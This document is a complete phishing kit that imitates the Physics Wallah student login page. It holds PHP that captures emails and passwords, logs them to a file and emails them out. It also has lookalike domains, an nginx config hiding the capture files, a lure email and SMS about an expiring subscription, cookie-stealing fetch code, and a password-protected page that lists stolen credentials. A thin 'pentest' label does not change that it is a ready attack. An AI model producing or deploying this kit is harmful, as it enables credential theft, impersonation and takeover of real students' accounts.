<!DOCTYPE html>
<html>
<head>
    <title>Physics Wallah - Login</title>
    <link rel="stylesheet" href="https://pwonlyias.com/static/media/pw-logo.9f7b7b7b.svg"> <!-- Clone their assets -->
    <style>
        /* Exact CSS ripped from pwonlyias.com login page */
        body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .login-container { max-width: 400px; margin: 100px auto; padding: 40px; background: white; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
        .pw-logo { width: 120px; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        .login-btn { background: #ff6b35; color: white; border: none; padding: 15px; width: 100%; font-size: 18px; border-radius: 5px; cursor: pointer; }
        .login-btn:hover { background: #e55a2b; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="pw-logo.png" alt="Physics Wallah" class="pw-logo">
        <h2>Login to your PW Account</h2>
        <form id="loginForm" action="capture.php" method="POST">
            <input type="email" name="email" placeholder="Email or Mobile Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">LOGIN</button>
        </form>
        <p style="text-align: center; margin-top: 20px; color: #666;">Access your courses, live classes & tests</p>
    </div>
    
    <script>
        // Auto-submit and redirect to real PW site
        document.getElementById('loginForm').addEventListener('submit', function() {
            setTimeout(() => {
                window.location.href = 'https://pwonlyias.com/login';
            }, 1000);
        });
        <?php
if ($_POST) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Log to file
    $log = "[$timestamp] IP: $ip | UA: $user_agent | Email: $email | Pass: $password\n";
    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Email credentials to you (use your server)
    mail('your-pentest-email@domain.com', 'PW Creds Captured', $log);
    
    // Optional: Save to database
    // $pdo->prepare("INSERT INTO creds (email, pass, ip, ua, time) VALUES (?, ?, ?, ?, ?)")->execute([$email, $password, $ip, $user_agent, $timestamp]);
}
?>
pw-live-classes.com      → your phishing server
pw-subscription-login.com
physicswallah-login.com
pwonlyias-login.com

server {
    listen 443 ssl;
    server_name pw-subscription-login.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        root /var/www/phish;
        index index.html;
        try_files $uri $uri/ /index.html;
    }
    
    location ~* \.(php|txt)$ {
        deny all;  # Hide capture.php and logs
    }
}
Subject: 🚨 Your PW Subscription Expiring Soon - Renew Now!

Hi [Student Name],

Your Physics Wallah subscription expires in 3 days. 
Complete verification here to continue unlimited access:

🔗 https://pw-subscription-login.com/verify

- Live Classes
- Recorded Lectures  
- Test Series
- Doubt Solving

Team PW

PW Alert: Your subscription needs verification! Login now: https://pw-live-classes.com
Reply STOP to unsubscribe

// After form submit, attempt to steal real session
fetch('https://pwonlyias.com/login', {
    method: 'POST',
    credentials: 'include',
    body: new FormData(document.getElementById('loginForm'))
}).then(r => r.headers.get('set-cookie')).then(cookies => {
    // Send cookies back
    fetch('steal_cookies.php', {method: 'POST', body: `cookies=${cookies}`});
});

<?php
session_start();
if ($_POST['pass'] !== 'pentest2026') die('Access Denied');
?>
<html>
<body>
<h2>PW Creds Captured (<?php echo count(file('credentials.txt')); ?>)</h2>
<pre><?php echo file_get_contents('credentials.txt'); ?></pre>
</body>
</html>
    </script>
</body>
</html>
